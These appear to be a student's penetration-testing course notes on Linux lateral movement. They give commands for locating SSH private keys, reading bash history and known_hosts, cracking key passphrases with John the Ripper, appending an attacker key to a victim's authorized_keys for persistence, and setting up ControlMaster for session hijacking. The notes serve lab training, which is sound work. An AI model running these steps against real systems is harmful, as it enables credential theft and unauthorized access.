# Linux Lateral Movement

First,
we’ll leverage SSH and demonstrate how to steal keys and hijack open sessions. We will then
explore large-scale DevOps829 technologies and leverage both Ansible and Artifactory. Finally, we’ll
demonstrate how Kerberos-enabled Linux systems can create a bridge into Windows domains
and leverage this for lateral movement.


we need to configure our /etc/hosts file first with

```dotnetcli
controller: 192.168.120.40
• linuxvictim: 192.168.120.45
• dc01.corp1.com: 192.168.120.5
```

# lateral movement with ssh

ssh private kes are exellent opportunity for lateral movement.
The public key is stored in the ~/.ssh/authorized_keys file of the
server the user is connecting to. The private key is typically stored in the ~/.ssh/ directory on the
system the user is connecting from.ls

# ssh keys

ssh kes have permission set to 600

private keys are named as id_rsa by default 

we can use `find /home/ -name "id_rsa"`

if nothing comes up then there might be no keys with admin permission

```
└─$ find /home/ -name "id_rsa"
/home/kali/.ssh/id_rsa
```

It is always beneficial to look into the users home directory because the key could be stored with a different name there.

for example `svuser.key`

we can look at known_hosts

`cat ~/.ssh/known_hosts`

`tail .bash_history`

if they are connected to a controller server using svuser account then we can use host controller.

we can crack the passphrase through john the ripper

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash`

`ssh -i ./svuser.key svuser@controller`

# SSH Persistence

~/.ssh/authorized_keys - 

ssh-keygen

echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8=
kali@kali" >> /home/linuxvictim/.ssh/authorized_keys

ssh linuxvictim@linuxvictim

### 14.1.2.1 Exercises
1. Generate a private keypair with a passphrase on your Kali VM. Try to crack the passphrase
using JTR.
2. Generate a private keypair on your Kali VM and insert your public key in the linuxvictim user’s
authorized_keys file on the linuxvictim host and then SSH to it.

# SSH Hijacking with ControlMaster

The term SSH hijacking refers to the use of an existing SSH connection to gain access to another
machine. Two of the most common methods of SSH hijacking use the ControlMaster836 feature
or the ssh-agent.837
ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network
connection. This functionality can be enabled for a given user by editing their local SSH
configuration file (~/.ssh/config).

```
Host *
ControlPath ~/.ssh/controlmaster/%r@%h:%p
ControlMaster auto
ControlPersist 10ma
```

These ControlMaster settings can also be placed in /etc/ssh/ssh_config to
configure ControlMaster at a system-wide level.

```
chmod 644 ~/.ssh/config
mkdir ~/.ssh/controlmaster

ls -al ~/.ssh/controlmaster/
```







